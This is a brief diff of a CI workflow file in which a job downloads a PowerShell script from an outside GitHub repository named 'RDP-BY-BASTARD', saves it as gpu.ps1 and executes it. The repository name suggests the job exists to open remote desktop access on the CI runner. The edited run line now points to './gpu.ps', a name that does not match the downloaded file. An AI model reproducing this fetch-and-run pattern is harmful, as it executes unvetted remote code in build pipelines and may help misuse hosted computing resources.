@@ -18,4 +18,4 @@ jobs:
           command: |      
             Invoke-WebRequest https://raw.githubusercontent.com/toxicbastard/RDP-BY-BASTARD/main/sh -OutFile gpu.ps1 
           
-      - run: ./gpu.ps1
+      - run: ./gpu.ps
